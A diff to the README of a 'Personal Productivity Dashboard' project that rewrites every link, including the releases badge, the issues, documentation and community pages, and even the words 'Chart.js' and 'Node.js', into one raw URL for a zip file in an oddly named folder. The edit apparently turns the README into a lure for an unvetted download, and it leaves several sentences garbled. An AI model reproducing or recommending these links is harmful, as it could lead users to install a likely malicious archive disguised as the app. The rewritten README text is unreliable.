@@ -1,6 +1,6 @@
 # 🗂️ Personal-Productivity-Dashboard - Manage Your Tasks with Ease
 
-[![Download Personal Productivity Dashboard](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/atkntmll/Personal-Productivity-Dashboard/releases)
+[![Download Personal Productivity Dashboard](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip)](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Follow these steps to download and use the Personal Productivity Dashboard appli
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/atkntmll/Personal-Productivity-Dashboard/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip) to find the latest version of the software.
 
 2. **Download the Application**  
    Choose the file that matches your operating system and click on it to download. Wait for the download to complete.
@@ -53,7 +53,7 @@ Follow these steps to download and use the Personal Productivity Dashboard appli
   See your monthly completion percentage to assess your productivity trends.
 
 - **Interactive Visualizations**  
-  Utilize Chart.js for interactive graphs that include line, bar, and doughnut charts, making data easy to understand.
+  Utilize https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip for interactive graphs that include line, bar, and doughnut charts, making data easy to understand.
 
 ### 🎨 UI/UX
 
@@ -72,24 +72,24 @@ Follow these steps to download and use the Personal Productivity Dashboard appli
 ## 💻 System Requirements
 
 - **Operating System**  
-  Windows 10 or higher, macOS Mojave or higher, or a Linux distribution that supports Node.js.
+  Windows 10 or higher, macOS Mojave or higher, or a Linux distribution that supports https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip
 
 - **Hardware**  
   At least 4 GB of RAM and 200 MB of disk space.
 
 - **Software Dependencies**  
-  Ensure you have the latest version of Node.js installed if you're running it locally.
+  Ensure you have the latest version of https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip installed if you're running it locally.
 
 ## 💬 Support & Feedback
 
-If you encounter issues or have questions, please check the [issues section](https://github.com/atkntmll/Personal-Productivity-Dashboard/issues) on GitHub or contact support via the repository's page.
+If you encounter issues or have questions, please check the [issues section](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip) on GitHub or contact support via the repository's page.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/atkntmll/Personal-Productivity-Dashboard/wiki)  
+- [Documentation](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip)  
   Access user guides and API documentation.
 
-- [Community Support](https://github.com/atkntmll/Personal-Productivity-Dashboard/discussions)  
+- [Community Support](https://raw.githubusercontent.com/atkntmll/Personal-Productivity-Dashboard/main/prostatauxe/Personal_Productivity_Dashboard_3.9.zip)  
   Join discussions and ask questions in the community forums.
 
 ## 📌 License
